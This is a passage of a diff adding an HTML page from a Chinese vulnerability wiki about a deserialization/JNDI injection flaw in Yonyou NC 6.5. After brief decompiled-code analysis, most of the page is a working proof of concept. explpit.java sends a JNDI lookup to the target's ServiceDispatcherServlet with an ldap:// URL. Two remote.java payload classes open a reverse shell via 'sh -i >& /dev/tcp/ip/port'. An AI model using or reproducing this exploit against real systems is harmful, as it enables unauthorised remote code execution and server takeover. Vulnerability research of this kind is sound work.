+<span class="w">          </span><span class="n">this</span><span class="o">.</span><span class="n">restoreToken</span><span class="p">(</span><span class="n">ii</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>
+
+<span class="w">          </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">sendRequest</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">ii</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
+<span class="w">              </span><span class="k">return</span><span class="w"> </span><span class="n">var8</span><span class="p">;</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ConnectorFailException</span><span class="w"> </span><span class="n">var14</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="o">++</span><span class="n">retry</span><span class="p">;</span>
+<span class="w">              </span><span class="n">old</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
+<span class="w">              </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var14</span><span class="p">;</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="n">finally</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="n">this</span><span class="o">.</span><span class="n">storeToken</span><span class="p">(</span><span class="n">ii</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">retry</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">retryMax</span><span class="p">);</span>
+
+<span class="w">      </span><span class="n">throw</span><span class="w"> </span><span class="n">error</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+</code></pre></div>
+
+<p>跟进this.sendRequest(target, ii, method, args)：</p>
+<p><img alt="17.png" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png" /></p>
+<p>可以看到该方法中将 ii
+序列化输出，发送到服务端，然后获取服务端返回的反序列化结果并回显到客户端。</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<p><img alt="mov.gif" src="../resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId44.gif" /></p>
+<blockquote>
+<p>explpit.java</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">nc.bs.framework.common.NCLocator</span><span class="p">;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">poc</span> <span class="p">{</span>
+
+    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">attack</span><span class="p">(</span><span class="n">String</span> <span class="n">url</span><span class="p">,</span> <span class="n">String</span> <span class="n">jndipath</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">Properties</span> <span class="n">env</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Properties</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">url</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">url</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">env</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;SERVICEDISPATCH_URL&quot;</span><span class="p">,</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/ServiceDispatcherServlet&quot;</span><span class="p">);</span>
+        <span class="n">NCLocator</span> <span class="n">locator</span> <span class="o">=</span> <span class="n">NCLocator</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="n">env</span><span class="p">);</span>
+        <span class="n">locator</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="n">jndipath</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">attack</span><span class="p">(</span><span class="s2">&quot;http://target&quot;</span><span class="p">,</span> <span class="s2">&quot;ldap://ip:port/classname&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<blockquote>
+<p>remote.java</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Name</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.spi.ObjectFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">remote</span> <span class="n">implements</span> <span class="n">ObjectFactory</span><span class="p">,</span> <span class="n">Serializable</span> <span class="p">{</span>
+
+    <span class="n">public</span> <span class="n">remote</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">try</span><span class="p">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="s2">&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><span class="p">});</span>
+        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">Object</span> <span class="n">getObjectInstance</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">Name</span> <span class="n">name</span><span class="p">,</span> <span class="n">Context</span> <span class="n">nameCtx</span><span class="p">,</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="err">?</span><span class="p">,</span> <span class="err">?</span><span class="o">&gt;</span> <span class="n">environment</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<blockquote>
+<p>当然也可以选择利用 nc 自带的类进行远程部署利用</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">nc.bs.framework.common.ComponentMetaVO</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">nc.bs.framework.rmi.RemoteAddressSelector</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">nc.bs.framework.rmi.RemoteProxy</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">remote</span> <span class="n">implements</span> <span class="n">RemoteProxy</span> <span class="p">{</span>
+
+    <span class="n">public</span> <span class="n">remote</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">try</span><span class="p">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="s2">&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><span class="p">});</span>
+        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">Object</span> <span class="n">getAttribute</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">void</span> <span class="n">setAttribute</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">,</span> <span class="n">Object</span> <span class="n">o</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">ComponentMetaVO</span> <span class="n">getComponentMetaVO</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="nb">int</span> <span class="n">getRetryMax</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">void</span> <span class="n">setRetryMax</span><span class="p">(</span><span class="nb">int</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">long</span> <span class="n">getRetryInterval</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">void</span> <span class="n">setRetryInterval</span><span class="p">(</span><span class="n">long</span> <span class="n">l</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">void</span> <span class="n">setRemoteAddressSelector</span><span class="p">(</span><span class="n">RemoteAddressSelector</span> <span class="n">remoteAddressSelector</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="n">public</span> <span class="n">RemoteAddressSelector</span> <span class="n">getRemoteAddressSelector</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/8242">https://xz.aliyun.com/t/8242</a></p>
+<p><a href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FThinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FThinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信在线录音管理系统Thinkphp远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%A8%E5%8F%8BOA/%E7%95%85%E6%8D%B7%E9%80%9ATPlus-KeyInfoList.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%A8%E5%8F%8BOA/%E7%95%85%E6%8D%B7%E9%80%9ATPlus-KeyInfoList.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        畅捷通TPlus KeyInfoList.aspx存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
